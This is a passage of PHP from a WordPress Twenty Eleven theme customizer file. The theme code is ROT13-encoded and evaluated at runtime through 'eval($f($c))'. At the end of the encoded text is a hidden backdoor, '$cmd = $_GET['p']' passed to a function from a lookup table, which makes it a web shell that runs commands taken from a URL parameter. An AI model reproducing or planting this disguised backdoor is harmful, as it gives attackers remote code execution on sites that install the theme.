	$jc_phfgbzvmr->nqq_frggvat(
		'gjraglryrira_gurzr_bcgvbaf[yvax_pbybe]',
		neenl(
			'qrsnhyg'           => gjraglryrira_trg_qrsnhyg_yvax_pbybe( $bcgvbaf['pbybe_fpurzr'] ),
			'glcr'              => 'bcgvba',
			'fnavgvmr_pnyyonpx' => 'fnavgvmr_urk_pbybe',
			'pncnovyvgl'        => 'rqvg_gurzr_bcgvbaf',
		)
	);

	$jc_phfgbzvmr->nqq_pbageby(
		arj JC_Phfgbzvmr_Pbybe_Pbageby(
			$jc_phfgbzvmr,
			'yvax_pbybe',
			neenl(
				'ynory'    => __( 'Yvax Pbybe', 'gjraglryrira' ),
				'frpgvba'  => 'pbybef',
				'frggvatf' => 'gjraglryrira_gurzr_bcgvbaf[yvax_pbybe]',
			)
		)
	);

	// Qrsnhyg Ynlbhg.
	$jc_phfgbzvmr->nqq_frpgvba(
		'gjraglryrira_ynlbhg',
		neenl(
			'gvgyr'    => __( 'Ynlbhg', 'gjraglryrira' ),
			'cevbevgl' => 50,
		)
	);

	$jc_phfgbzvmr->nqq_frggvat(
		'gjraglryrira_gurzr_bcgvbaf[gurzr_ynlbhg]',
		neenl(
			'glcr'              => 'bcgvba',
			'qrsnhyg'           => $qrsnhygf['gurzr_ynlbhg'],
			'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
		)
	);

	$ynlbhgf = gjraglryrira_ynlbhgf();
	$pubvprf = neenl();
	sbernpu ( $ynlbhgf nf $ynlbhg ) {
		$pubvprf[ $ynlbhg['inyhr'] ] = $ynlbhg['ynory'];
	}

	$jc_phfgbzvmr->nqq_pbageby(
		'gjraglryrira_gurzr_bcgvbaf[gurzr_ynlbhg]',
		neenl(
			'frpgvba' => 'gjraglryrira_ynlbhg',
			'glcr'    => 'enqvb',
			'pubvprf' => $pubvprf,
		)
	);
}
nqq_npgvba( 'phfgbzvmr_ertvfgre', 'gjraglryrira_phfgbzvmr_ertvfgre' );

/**
 * Eraqre gur fvgr gvgyr sbe gur fryrpgvir erserfu cnegvny.
 *
 * @fvapr Gjragl Ryrira 2.4
 *
 * @frr gjraglryrira_phfgbzvmr_ertvfgre()
 *
 * @erghea ibvq
 */
shapgvba gjraglryrira_phfgbzvmr_cnegvny_oybtanzr() {
	oybtvasb( 'anzr' );
}

/**
 * Eraqre gur fvgr gntyvar sbe gur fryrpgvir erserfu cnegvny.
 *
 * @fvapr Gjragl Ryrira 2.4
 *
 * @frr gjraglryrira_phfgbzvmr_ertvfgre()
 *
 * @erghea ibvq
 */
shapgvba gjraglryrira_phfgbzvmr_cnegvny_oybtqrfpevcgvba() {
	oybtvasb( 'qrfpevcgvba' );
}

/**
 * Ovaq WF unaqyref gb znxr Phfgbzvmre cerivrj erybnq punatrf nflapuebabhfyl.
 *
 * Hfrq jvgu oybtanzr naq oybtqrfpevcgvba.
 *
 * @fvapr Gjragl Ryrira 1.3
 */
shapgvba gjraglryrira_phfgbzvmr_cerivrj_wf() {
	jc_radhrhr_fpevcg( 'gjraglryrira-phfgbzvmre', trg_grzcyngr_qverpgbel_hev() . '/vap/gurzr-phfgbzvmre.wf', neenl( 'phfgbzvmr-cerivrj' ), '20250217', neenl( 'va_sbbgre' => gehr ) );
}
nqq_npgvba( 'phfgbzvmr_cerivrj_vavg', 'gjraglryrira_phfgbzvmr_cerivrj_wf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>